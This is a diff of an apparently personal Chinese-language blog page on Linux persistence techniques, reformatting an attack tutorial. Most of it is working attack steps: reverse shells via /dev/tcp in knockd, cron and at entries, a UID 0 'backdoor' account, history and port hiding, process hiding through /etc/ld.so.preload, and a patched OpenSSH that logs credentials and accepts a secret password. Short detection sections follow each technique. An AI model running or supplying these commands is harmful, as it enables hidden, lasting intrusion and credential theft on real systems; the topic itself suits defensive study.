@@ -126,7 +126,7 @@
                   
                   <span class="post-meta">
                     <i class="far fa-chart-bar"></i>
-                    4.3k 字
+                    4.2k 字
                   </span>
                 
 
@@ -214,11 +214,12 @@ echo The end.  </code></pre><p>运行test脚本，当我们执行中断信号(ct
 <li>安装knockd：rpm -ivh /root/rpmbuild/RPMS/x86_64/knock-*<br>此时knocked安装成功。<br>最后</li>
 <li>根据自己的需要进行配置：/etc/knockd.conf</li>
 <li>启动knocked服务： /etc/init.d/knockd start<br>作为安全管理工具，knocked可以隐藏自己的端口，当管理员正确敲击端口”密码序列”，knocked打开预先设定好的端口，让管理员访问。<br>比如管理员想要用手中的设备进行ssh连接，knocked配置如下：<pre><code>[options]  
-  LogFile = /var/log/knockd.log  //日志地址
+  LogFile = /var/log/knockd.log  //日志地址       
 </code></pre></li>
 </ol>
 <p>[opencloseSSH]<br>        sequence = 1000,1001,1002<br>        seq_timeout   = 15<br>        tcpflags = syn<br>        start_command = iptables -I INPUT -s %IP% -p tcp –dport ssh -j ACCEPT<br>        cmd_timeout   = 10<br>        stop_command  = /sbin/iptables -D INPUT -s %IP% -p tcp –dport ssh -j ACCEPT  </p>
-<pre><code>当依次敲击1000，1001，1002三个端口后，服务器添加一条iptables规则iptables -I INPUT -s %IP% -p tcp --dport ssh -j ACCEPT，允许敲击正确的ip通过ssh端口访问服务器。
+<pre><code>
+当依次敲击1000，1001，1002三个端口后，服务器添加一条iptables规则iptables -I INPUT -s %IP% -p tcp --dport ssh -j ACCEPT，允许敲击正确的ip通过ssh端口访问服务器。
 
 端口敲击序列  
 ![3.1](/img/持久化3.1.png)   
@@ -233,224 +234,56 @@ knocked日志
 ### Knock后门
 利用knocked可以构建我们的后门
 在knocked加入一个功能：</code></pre><p>[Bounce shell]<br>        sequence = 1000,1001,1002<br>        seq_timeout = 30<br>        tcpflags = syn<br>        tart_command = bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1  </p>
-<pre><code>在我们的攻击机上开启监听：nc -lvp 2333  
-依次敲击1000 1001 1002，反弹shell  
- ![3.3](/img/持久化3.3.png)   
+<p>```  </p>
+<p>在我们的攻击机上开启监听：nc -lvp 2333<br>依次敲击1000 1001 1002，反弹shell<br> <img src="/img/%E6%8C%81%E4%B9%85%E5%8C%963.3.png" srcset="/img/loading.gif" alt="3.3">   </p>
+<h3 id="安全检测-1"><a href="#安全检测-1" class="headerlink" title="安全检测"></a>安全检测</h3><p>记录查看发送到系统和从系统发出的网络数据包，查找不属于已建立的无关数据包。<br>参考<br><a href="https://cloud.tencent.com/developer/article/1005328" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1005328</a><br><a href="http://vulhub.org.cn/attack/techniques/T1205.md" target="_blank" rel="noopener">http://vulhub.org.cn/attack/techniques/T1205.md</a></p>
+<h2 id="4-新建账户"><a href="#4-新建账户" class="headerlink" title="4.    新建账户"></a>4.    新建账户</h2><p>具有足够访问级别的攻击者可以创建本地系统或域帐户。 这些帐户可用持久化，不需要在系统上部署持久远程访问工具。  </p>
+<h3 id="useradd命令和两个文件"><a href="#useradd命令和两个文件" class="headerlink" title="useradd命令和两个文件"></a>useradd命令和两个文件</h3><p><strong>useradd</strong><br>条件：超级用户权限<br>格式：useradd [-d home] [-s shell] [-c comment] [-m [-k template]] [-f inactive] [-e expire ] [-p passwd] [-r] name<br>参数：<br>-c：加上备注文字，备注文字保存在passwd的备注栏中。<br>　　-d：指定用户登入时的主目录，替换系统默认值/home/&lt;用户名&gt;<br>　　-D：变更预设值。<br>　　-e：指定账号的失效日期，日期格式为MM/DD/YY，例如06/30/12。缺省表示永久有效。<br>　　-f：指定在密码过期后多少天即关闭该账号。如果为0账号立即被停用；如果为-1则账号一直可用。默认值为-1.<br>　　-g：指定用户所属的群组。值可以使组名也可以是GID。用户组必须已经存在的，期默认值为100，即users。<br>　　-G：指定用户所属的附加群组。<br>　　-m：自动建立用户的登入目录。<br>　　-M：不要自动建立用户的登入目录。<br>　　-n：取消建立以用户名称为名的群组。<br>　　-r：建立系统账号。<br>-s：指定用户登入后所使用的shell。默认值为/bin/bash。<br>例如：<br>建立一个新用户账户testuser1，并设置UID为544，主目录为/usr/testuser1，属于users组：<br>#useradd -u 544 -d /usr/testuser1  -g users -m  testuser1  </p>
+<p><strong>/etc/passwd和/etc/shadow</strong><br>/etc/passwd：用户信息<br>文件各字段   用户名：密码：用户ID：组ID：身份描述：用户的家目录：用户登录后所使用的SHELL</p>
+<p>/etc/shadow：用户密码信息<br>文件各字段  用户名：密码的MD5加密值：数字表示自系统使用以来口令被修改的天数：数字表示口令的最小修改间隔：数字表示口令更改的周期：数字表示口令失效的天数：数字表示口令失效以后帐号会被锁定多少天：用户帐号到期时间：保留字段尚未使用<br>新建账户<br>环境：<br>Centos 7(靶机)<br>Ubuntu 16(攻击机）<br>Useradd -o -u 0 backdoor # 添加账户“backdoor” UID为0（root权限）<br>echo “123456” | passwd –stdin backdoor      # 设置密码  </p>
+<p>通过ssh远程登录backdoor账户</p>
+<h3 id="安全检测-2"><a href="#安全检测-2" class="headerlink" title="安全检测"></a>安全检测</h3><p>收集建立账户的数据，定期检查自己的账户。</p>
+<p>参考<br><a href="https://www.cnblogs.com/EdwinChan/p/8350879.html" target="_blank" rel="noopener">https://www.cnblogs.com/EdwinChan/p/8350879.html</a></p>
+<h2 id="5-隐藏文件和目录"><a href="#5-隐藏文件和目录" class="headerlink" title="5.    隐藏文件和目录"></a>5.    隐藏文件和目录</h2><h3 id="隐藏文件和目录"><a href="#隐藏文件和目录" class="headerlink" title="隐藏文件和目录"></a>隐藏文件和目录</h3><p>Linux下创建文件和目录，在命名前加一个“.“代表隐藏。<br>touch .webshell.php 创建名字为 .webshell.php 的文件<br>mkdir …/ 创建名字为 … 的文件夹<br>ls命令无法查看，ls -a可查看隐藏文件及目录</p>
+<h3 id="隐藏历史操作命令"><a href="#隐藏历史操作命令" class="headerlink" title="隐藏历史操作命令"></a>隐藏历史操作命令</h3><p>1.关闭当前记录<br>关闭 set +o history<br>开启 set -o history<br>Ps：命令前加空格，命令本身也不会被记录。<br>2.清除历史记录<br>查看历史记录：#history<br>历史记录保存的位置：#cat /root/.bash_history  </p>
+<h3 id="端口隐藏"><a href="#端口隐藏" class="headerlink" title="端口隐藏"></a>端口隐藏</h3><p><strong>通过端口复用来隐藏端口</strong>  </p>
+<h4 id="1-SSLH"><a href="#1-SSLH" class="headerlink" title="1.SSLH"></a>1.SSLH</h4><p>安装SSLH<br> sudo apt-get install sslh<br>配置SSLH<br> 编辑 SSLH 配置文件：<br> sudo vi /etc/default/sslh  </p>
+<p> 找到下列行：Run=no  将其修改为：Run=yes<br> 修改以下行以允许 SSLH 在所有可用接口上侦听端口 443<br> DAEMON_OPTS=”–user sslh –listen 0.0.0.0:443 –ssh 127.0.0.1:22 –ssl 127.0.0.1:443 –pidfile /var/run/sslh/sslh.pid”<br><strong>安全检测</strong></p>
+<p>ps -ef | grep sslh 查看端口</p>
+<h4 id="2-iptables"><a href="#2-iptables" class="headerlink" title="2.iptables"></a>2.iptables</h4><p>端口复用链<br>iptables -t nat -N LETMEIN<br>端口复用规则<br>iptables -t nat  -A LETMEIN -p tcp -j REDIRECT –to-port 22<br>开启开关<br>iptables -A INPUT -p tcp -m string –string ‘threathuntercoming’ –algo bm -m recent –set –name letmein –rsource -j ACCEPT<br>关闭开关<br>iptables -A INPUT -p tcp -m string –string ‘threathunterleaving’ –algo bm -m recent –name letmein –remove -j ACCEPT<br>let’s do it<br>iptables -t nat -A PREROUTING -p tcp –dport 80 –syn -m recent –rcheck –seconds 3600 –name letmein –rsource -j LETMEIN  </p>
+<p><strong>利用方式:</strong><br>开启复用<br>echo threathuntercoming | socat - tcp:192.168.28.128:80<br>ssh使用80端口进行登录<br>ssh -p 80 <a href="mailto:root@192.168.28.128">root@192.168.28.128</a><br>关闭复用<br>echo threathunterleaving | socat - tcp:192.168.28.128:80<br>具体参考：<br><a href="https://www.freebuf.com/articles/network/137683.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/137683.html</a></p>
+<h3 id="隐藏进程"><a href="#隐藏进程" class="headerlink" title="隐藏进程"></a>隐藏进程</h3><p><strong>Libprocesshider</strong><br>利用 LD_PRELOAD 来实现系统函数的劫持<br>下载程序编译<br>git clone <a href="https://github.com/gianlucaborello/libprocesshider.git" target="_blank" rel="noopener">https://github.com/gianlucaborello/libprocesshider.git</a><br>cd libprocesshider/ &amp;&amp; make<br>移动文件到/usr/local/lib/目录下<br>cp libprocesshider.so /usr/local/lib/<br>把它加载到全局动态连接局<br>echo /usr/local/lib/libprocesshider.so &gt;&gt; /etc/ld.so.preload  </p>
+<p>运行evil_script.py测试<br>./evil_script.py 127.0.0.1 2333<br>Top命令无法找到evil_script.py  </p>
+<p><strong>安全检测</strong><br>unhide 是一个小巧的网络取证工具，能够发现那些借助rootkit，LKM及其它技术隐藏的进程和TCP / UDP端口。<br>安装<br>sudo yum install unhide<br>使用<br>unhide [options] test_list<br> <img src="/img/%E6%8C%81%E4%B9%85%E5%8C%965.1.png" srcset="/img/loading.gif" alt="5.1">   </p>
+<h2 id="6-预加载型恶意动态链接库"><a href="#6-预加载型恶意动态链接库" class="headerlink" title="6.    预加载型恶意动态链接库"></a>6.    预加载型恶意动态链接库</h2><p>动态链接库预加载机制是系统提供给用户运行自定义动态链接库的一种方式，在可执行程序运行之前就会预先加载用户定义的动态链接库的一种技术，这种技术可以重写系统的库函数，这种技术可以用来重写系统中有漏洞的库函数，达到修复漏洞的目的，但也可以被用来劫持。<br> <img src="/img/%E6%8C%81%E4%B9%85%E5%8C%966.1.png" srcset="/img/loading.gif" alt="6.1">    </p>
+<p>LD_PRELOAD （用于预加载的环境变量）<br>LD_PRELOAD环境变量是会及时生效的<br>LD_PRELOAD=/lib/evil.so #LD_PRELOAD的值设置为要预加载的动态链接库<br>export LD_PRELOAD        #导出环境变量使该环境变量生效<br>unset LD_PRELOAD         #解除设置的LD_PRELOAD环境变量<br>常用工具：cub3 <a href="https://github.com/mempodippy/cub3" target="_blank" rel="noopener">https://github.com/mempodippy/cub3</a><br>/etc/ld.so.preload （用于预加载的配置文件）<br>将恶意so文件写入/etc/ld.so.preload就行:<br>echo “/lib/evil.so” &gt; /etc/ld.so.preload<br>常用工具：Vlany  <a href="https://github.com/mempodippy/vlany" target="_blank" rel="noopener">https://github.com/mempodippy/vlany</a>  </p>
+<h3 id="安全检测-3"><a href="#安全检测-3" class="headerlink" title="安全检测"></a>安全检测</h3><p>通过strace命令去跟踪预加载的文件是否为/etc/ld.so.preload，以及文件中是否有异常的动态链接库,文件完整性校验。以及检查是否设置LD_PRELOAD环境变量(echo $LD_PRELOAD)等。</p>
+<h2 id="7-本地作业调度"><a href="#7-本地作业调度" class="headerlink" title="7.    本地作业调度"></a>7.    本地作业调度</h2><p>本地作业调度就是常说的计划任务</p>
+<h3 id="cron"><a href="#cron" class="headerlink" title="cron"></a>cron</h3><p>通过修改/etc/crontab，/etc/cron.d/目录或 Cron 守护进程支持的其他位置可以安装系统级的 cron 作业。而每个用户的 Cron 作业是通过 crontab 使用具有特定格式的 crontab 文件安装的。­它在 macOS 和 Linux 系统上都有效。<br>这些方法允许在没有用户交互的情况下在后台以特定的周期间隔执行命令或脚本。攻击者可以利用作业调度在系统启动时执行程序或为了持久性而在预定的基础上执行程序， 作为横向移动的一部分执行，获取 root 权限，或者在特定帐户的上下文中运行进程。  </p>
+<p>靶机上设定计划任务：<br>(crontab -l;echo ‘*/1 * * * * exec 9&lt;&gt; /dev/tcp/127.0.0.1/2333;exec 0&lt;&9;exec 1&gt;&amp;9 2&gt;&1;/bin/bash –noprofile -i’)|crontab -  </p>
+<p>1分钟后攻击机上成功监听：  </p>
+<h3 id="at"><a href="#at" class="headerlink" title="at"></a>at</h3><p>at 程序是另一种方式，基于 POSIX 的系统（包括 macOS 和 Linux)。用于将程序或脚本作业安排在之后的日期和/或时间执行的一次性任务(cron多次)。<br>[root@localhost ~]# date             # 查看当前时间<br>[root@localhost ~]# at 00:27        # 创建at计划任务  +  时间<br>at&gt; bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1                    # 在08：26  bash命令反弹shell<br>at&gt; &lt;EOT&gt;                            # Ctrl+D  结束    </p>
+<p>8：26攻击机上成功监听</p>
+<h3 id="安全检测-4"><a href="#安全检测-4" class="headerlink" title="安全检测"></a>安全检测</h3><p>一般通过crontab -l（at -l等）命令即可检测到定时任务后门。不同的linux发行版可能查看开机启动项的文件不大相同，Debian系linux系统一般是通过查看/etc/init.d目录有无最近修改和异常的开机启动项。而Redhat系的linux系统一般是查看/etc/rc.d/init.d或者/etc/systemd/system等目录。</p>
+<h2 id="8-Openssh"><a href="#8-Openssh" class="headerlink" title="8.    Openssh"></a>8.    Openssh</h2><p>通过在openssh源码中插入恶意代码并进行重新编译来替换原有sshd文件。插入的恶意代码可以是将登录成功的用户密码发送到远程服务器或者记录到某个log文件中。在openssh目录中找到includes.h文件。<br>安装后门<br>环境：centos6.9<br>下载openssh-5.9p1.tar.gz<br>wget <a href="http://ftp.jaist.ac.jp/pub/OpenBSD/OpenSSH/portable/openssh-5.9p1.tar.gz" target="_blank" rel="noopener">http://ftp.jaist.ac.jp/pub/OpenBSD/OpenSSH/portable/openssh-5.9p1.tar.gz</a><br>下载后门文件<br>wget <a href="http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz" target="_blank" rel="noopener">http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz</a><br>解压  </p>
+<blockquote>
+<p>tar zxvf openssh-5.9p1.tar.gz<br>tar zxvf openssh-5.9p1.patch.tar.gz    </p>
+</blockquote>
+<p>复制patch后门文件到正常openssh里面  </p>
+<blockquote>
+<p>cp openssh-5.9p1.patch/sshbd5.9p1.diff openssh-5.9p1<br>patch &lt; sshbd5.9p1.diff<br> <img src="/img/%E6%8C%81%E4%B9%85%E5%8C%968.1.png" srcset="/img/loading.gif" alt="8.1">     </p>
+</blockquote>
+<p>修改后门密码和文件记录 vim includes.h</p>
+<blockquote>
+<p>int secret_ok;<br>FILE <em>f;<br>#define ILOG “/tmp/ilog”  # 记录登录到本机的用户名和密码<br>#define OLOG “/tmp/olog”  # 记录本机登录到远程的用户名和密码<br>#define SECRETPW “test” # 远程连接密码<br>#endif /</em> INCLUDES_H */    </p>
+</blockquote>
+<p>编译安装  </p>
+<blockquote>
+<p>yum install -y openssl openssl-devel pam-devel zlib zlib-devel<br>./configure –prefix=/usr/ –sysconfdir=/etc/ssh/ –with-pam –with-kerberos5<br>make clean<br>make &amp;&amp; make install<br>service sshd start （centos7：systemctl restart sshd.service）  </p>
+</blockquote>
+<p>攻击机连接后门<br><img src="/img/%E6%8C%81%E4%B9%85%E5%8C%968.2.png" srcset="/img/loading.gif" alt="8.2">     </p>
+<h3 id="安全检测-5"><a href="#安全检测-5" class="headerlink" title="安全检测"></a>安全检测</h3><p>1、查看Openssh版本<br>ssh -V<br>2、查看ssh配置文件和/usr/sbin/sshd的时间<br>stat /usr/sbin/sshd<br>时间和版本都是可以修改的，所以不靠谱<br>3、查看日志<br>more /var/log/secure | grep “Accepted” | awk ‘{print $11}’ | uniq<br>4、通过strace监控sshd进程读写文件的操作<br>ps axu | grep sshd | grep -v grep #sshd父进程ID<br>strace -o sshd -ff -p 2908<br>grep open sshd* | grep -v -e No -e null -e denied| grep WR<br>5、一般的openssh后门都会将账户密码记录到文件或者发送到邮箱中<br>strings /usr/sbin/sshd |grep ‘[1-9]{1,3}.[1-9]{1,3}.’<br>strings /usr/sbin/sshd |grep ‘@’  </p>
 
-
-### 安全检测
-记录查看发送到系统和从系统发出的网络数据包，查找不属于已建立的无关数据包。  
-参考
-https://cloud.tencent.com/developer/article/1005328
-http://vulhub.org.cn/attack/techniques/T1205.md
-## 4.    新建账户
-具有足够访问级别的攻击者可以创建本地系统或域帐户。 这些帐户可用持久化，不需要在系统上部署持久远程访问工具。  
-### useradd命令和两个文件  
-**useradd**  
-条件：超级用户权限  
-格式：useradd [-d home] [-s shell] [-c comment] [-m [-k template]] [-f inactive] [-e expire ] [-p passwd] [-r] name  
-参数：   
--c：加上备注文字，备注文字保存在passwd的备注栏中。  
-　　-d：指定用户登入时的主目录，替换系统默认值/home/&lt;用户名&gt;  
-　　-D：变更预设值。  
-　　-e：指定账号的失效日期，日期格式为MM/DD/YY，例如06/30/12。缺省表示永久有效。  
-　　-f：指定在密码过期后多少天即关闭该账号。如果为0账号立即被停用；如果为-1则账号一直可用。默认值为-1.  
-　　-g：指定用户所属的群组。值可以使组名也可以是GID。用户组必须已经存在的，期默认值为100，即users。  
-　　-G：指定用户所属的附加群组。  
-　　-m：自动建立用户的登入目录。  
-　　-M：不要自动建立用户的登入目录。  
-　　-n：取消建立以用户名称为名的群组。  
-　　-r：建立系统账号。  
--s：指定用户登入后所使用的shell。默认值为/bin/bash。  
-例如：  
-建立一个新用户账户testuser1，并设置UID为544，主目录为/usr/testuser1，属于users组：  
-#useradd -u 544 -d /usr/testuser1  -g users -m  testuser1  
-
-**/etc/passwd和/etc/shadow**
-/etc/passwd：用户信息
-文件各字段   用户名：密码：用户ID：组ID：身份描述：用户的家目录：用户登录后所使用的SHELL
-
-/etc/shadow：用户密码信息  
-文件各字段  用户名：密码的MD5加密值：数字表示自系统使用以来口令被修改的天数：数字表示口令的最小修改间隔：数字表示口令更改的周期：数字表示口令失效的天数：数字表示口令失效以后帐号会被锁定多少天：用户帐号到期时间：保留字段尚未使用
-新建账户  
-环境：  
-Centos 7(靶机)  
-Ubuntu 16(攻击机）  
-Useradd -o -u 0 backdoor # 添加账户“backdoor” UID为0（root权限）  
-echo &quot;123456&quot; | passwd --stdin backdoor      # 设置密码  
-
-通过ssh远程登录backdoor账户
-
-### 安全检测
-收集建立账户的数据，定期检查自己的账户。
-
-参考
-https://www.cnblogs.com/EdwinChan/p/8350879.html
-## 5.    隐藏文件和目录
-### 隐藏文件和目录
-Linux下创建文件和目录，在命名前加一个“.“代表隐藏。
-touch .webshell.php 创建名字为 .webshell.php 的文件
-mkdir …/ 创建名字为 … 的文件夹
-ls命令无法查看，ls -a可查看隐藏文件及目录
-
-### 隐藏历史操作命令
-1.关闭当前记录  
-关闭 set +o history  
-开启 set -o history  
-Ps：命令前加空格，命令本身也不会被记录。  
-2.清除历史记录  
-查看历史记录：#history  
-历史记录保存的位置：#cat /root/.bash_history  
-### 端口隐藏  
-**通过端口复用来隐藏端口**  
-#### 1.SSLH  
-安装SSLH  
- sudo apt-get install sslh  
-配置SSLH
- 编辑 SSLH 配置文件：  
- sudo vi /etc/default/sslh  
-
- 找到下列行：Run=no  将其修改为：Run=yes  
- 修改以下行以允许 SSLH 在所有可用接口上侦听端口 443  
- DAEMON_OPTS=&quot;--user sslh --listen 0.0.0.0:443 --ssh 127.0.0.1:22 --ssl 127.0.0.1:443 --pidfile /var/run/sslh/sslh.pid&quot;  
-**安全检测**
-
-ps -ef | grep sslh 查看端口
-#### 2.iptables
-端口复用链  
-iptables -t nat -N LETMEIN  
-端口复用规则  
-iptables -t nat  -A LETMEIN -p tcp -j REDIRECT --to-port 22  
-开启开关  
-iptables -A INPUT -p tcp -m string --string &#39;threathuntercoming&#39; --algo bm -m recent --set --name letmein --rsource -j ACCEPT  
-关闭开关  
-iptables -A INPUT -p tcp -m string --string &#39;threathunterleaving&#39; --algo bm -m recent --name letmein --remove -j ACCEPT  
-let&#39;s do it  
-iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN  
-
-**利用方式:**
-开启复用  
-echo threathuntercoming | socat - tcp:192.168.28.128:80  
-ssh使用80端口进行登录  
-ssh -p 80 root@192.168.28.128  
-关闭复用  
-echo threathunterleaving | socat - tcp:192.168.28.128:80  
-具体参考：  
-https://www.freebuf.com/articles/network/137683.html
-### 隐藏进程
-**Libprocesshider**  
-利用 LD_PRELOAD 来实现系统函数的劫持
-下载程序编译  
-git clone https://github.com/gianlucaborello/libprocesshider.git  
-cd libprocesshider/ &amp;&amp; make  
-移动文件到/usr/local/lib/目录下  
-cp libprocesshider.so /usr/local/lib/  
-把它加载到全局动态连接局  
-echo /usr/local/lib/libprocesshider.so &gt;&gt; /etc/ld.so.preload  
-
-运行evil_script.py测试  
-./evil_script.py 127.0.0.1 2333  
-Top命令无法找到evil_script.py  
-
-**安全检测**  
-unhide 是一个小巧的网络取证工具，能够发现那些借助rootkit，LKM及其它技术隐藏的进程和TCP / UDP端口。  
-安装  
-sudo yum install unhide  
-使用  
-unhide [options] test_list  
- ![5.1](/img/持久化5.1.png)   
-
-## 6.    预加载型恶意动态链接库
-动态链接库预加载机制是系统提供给用户运行自定义动态链接库的一种方式，在可执行程序运行之前就会预先加载用户定义的动态链接库的一种技术，这种技术可以重写系统的库函数，这种技术可以用来重写系统中有漏洞的库函数，达到修复漏洞的目的，但也可以被用来劫持。 
- ![6.1](/img/持久化6.1.png)    
-
-LD_PRELOAD （用于预加载的环境变量）  
-LD_PRELOAD环境变量是会及时生效的  
-LD_PRELOAD=/lib/evil.so #LD_PRELOAD的值设置为要预加载的动态链接库  
-export LD_PRELOAD        #导出环境变量使该环境变量生效  
-unset LD_PRELOAD         #解除设置的LD_PRELOAD环境变量  
-常用工具：cub3 https://github.com/mempodippy/cub3  
-/etc/ld.so.preload （用于预加载的配置文件）  
-将恶意so文件写入/etc/ld.so.preload就行:  
-echo “/lib/evil.so” &gt; /etc/ld.so.preload  
-常用工具：Vlany  https://github.com/mempodippy/vlany  
-### 安全检测
-通过strace命令去跟踪预加载的文件是否为/etc/ld.so.preload，以及文件中是否有异常的动态链接库,文件完整性校验。以及检查是否设置LD_PRELOAD环境变量(echo $LD_PRELOAD)等。
-
-## 7.    本地作业调度
-本地作业调度就是常说的计划任务
-### cron
-通过修改/etc/crontab，/etc/cron.d/目录或 Cron 守护进程支持的其他位置可以安装系统级的 cron 作业。而每个用户的 Cron 作业是通过 crontab 使用具有特定格式的 crontab 文件安装的。­它在 macOS 和 Linux 系统上都有效。  
-这些方法允许在没有用户交互的情况下在后台以特定的周期间隔执行命令或脚本。攻击者可以利用作业调度在系统启动时执行程序或为了持久性而在预定的基础上执行程序， 作为横向移动的一部分执行，获取 root 权限，或者在特定帐户的上下文中运行进程。  
-
-靶机上设定计划任务：  
-(crontab -l;echo &#39;*/1 * * * * exec 9&lt;&gt; /dev/tcp/127.0.0.1/2333;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i&#39;)|crontab -  
-
-1分钟后攻击机上成功监听：  
-
-### at
-at 程序是另一种方式，基于 POSIX 的系统（包括 macOS 和 Linux)。用于将程序或脚本作业安排在之后的日期和/或时间执行的一次性任务(cron多次)。   
-[root@localhost ~]# date             # 查看当前时间  
-[root@localhost ~]# at 00:27        # 创建at计划任务  +  时间  
-at&gt; bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1                    # 在08：26  bash命令反弹shell  
-at&gt; \&lt;EOT&gt;                            # Ctrl+D  结束    
-
-8：26攻击机上成功监听
-
-### 安全检测
-一般通过crontab -l（at -l等）命令即可检测到定时任务后门。不同的linux发行版可能查看开机启动项的文件不大相同，Debian系linux系统一般是通过查看/etc/init.d目录有无最近修改和异常的开机启动项。而Redhat系的linux系统一般是查看/etc/rc.d/init.d或者/etc/systemd/system等目录。
-## 8.    Openssh
-通过在openssh源码中插入恶意代码并进行重新编译来替换原有sshd文件。插入的恶意代码可以是将登录成功的用户密码发送到远程服务器或者记录到某个log文件中。在openssh目录中找到includes.h文件。
-安装后门  
-环境：centos6.9  
-下载openssh-5.9p1.tar.gz  
-wget http://ftp.jaist.ac.jp/pub/OpenBSD/OpenSSH/portable/openssh-5.9p1.tar.gz  
-下载后门文件  
-wget http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz  
-解压  
-&gt;tar zxvf openssh-5.9p1.tar.gz  
-tar zxvf openssh-5.9p1.patch.tar.gz    
-
-复制patch后门文件到正常openssh里面  
-&gt;cp openssh-5.9p1.patch/sshbd5.9p1.diff openssh-5.9p1  
-patch &lt; sshbd5.9p1.diff  
- ![8.1](/img/持久化8.1.png)     
-
-修改后门密码和文件记录 vim includes.h
-&gt;int secret_ok;  
-FILE *f;  
-#define ILOG &quot;/tmp/ilog&quot;  # 记录登录到本机的用户名和密码  
-#define OLOG &quot;/tmp/olog&quot;  # 记录本机登录到远程的用户名和密码  
-#define SECRETPW &quot;test&quot; # 远程连接密码  
-#endif /* INCLUDES_H */    
-
-编译安装  
-&gt;yum install -y openssl openssl-devel pam-devel zlib zlib-devel  
-./configure --prefix=/usr/ --sysconfdir=/etc/ssh/ --with-pam --with-kerberos5  
-make clean  
-make &amp;&amp; make install  
-service sshd start （centos7：systemctl restart sshd.service）  
-
-攻击机连接后门
-![8.2](/img/持久化8.2.png)     
-### 安全检测
-1、查看Openssh版本  
-ssh -V  
-2、查看ssh配置文件和/usr/sbin/sshd的时间  
-stat /usr/sbin/sshd  
-#时间和版本都是可以修改的，所以不靠谱  
-3、查看日志  
-more /var/log/secure | grep &quot;Accepted&quot; | awk &#39;{print $11}&#39; | uniq  
-4、通过strace监控sshd进程读写文件的操作  
-ps axu | grep sshd | grep -v grep #sshd父进程ID  
-strace -o sshd -ff -p 2908  
-grep open sshd* | grep -v -e No -e null -e denied| grep WR  
-5、一般的openssh后门都会将账户密码记录到文件或者发送到邮箱中  
-strings /usr/sbin/sshd |grep &#39;[1-9]{1,3}.[1-9]{1,3}.&#39;  
-strings /usr/sbin/sshd |grep &#39;@&#39;  
-
-
-</code></pre>
             <hr>
           </div>
           <br>
@@ -494,7 +327,7 @@ strings /usr/sbin/sshd |grep &#39;@&#39;
       
   <script defer src="https://utteranc.es/client.js"
           repo="huuuz/huuuz.github.io"
-          issue-term="title"
+          issue-term="pathname"
   
           label="utterances"
     
